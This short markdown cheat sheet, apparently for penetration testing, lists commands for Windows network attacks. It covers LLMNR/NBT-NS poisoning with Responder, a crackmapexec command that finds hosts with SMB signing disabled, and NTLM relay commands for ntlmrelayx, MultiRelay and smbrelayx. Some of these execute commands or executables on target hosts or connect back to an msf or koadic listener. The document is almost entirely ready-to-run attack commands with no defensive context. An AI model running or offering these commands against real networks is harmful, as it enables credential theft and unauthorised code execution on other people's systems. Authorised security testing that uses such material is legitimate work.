## Poisoining Attack

#### Responder
```
responder -I eth0
```

#### Generate SMB Signing Disabled Hosts
```
crackmapexec smb --gen-relay-list smb_sigb_disbaled.txt ranges.txt
```
#### Relay Attacks 
ntlmrelayx
```
python3 ntlmrelayx.py -smb2support -tf filename
```
ntlmrelayx Comamnd execution
```
python3 ntlmrelayx.py -smb2support -tf filename -c <msf or koadic listener here>
```
Multirelay
```
python3 MultiRelay.py -t IP -u ALL
```
SMBrelay
```
python3 smbrelayx.py -h IP -c <command>
```
```
python3 smbrelayx.py -h IP -e <executable>
```
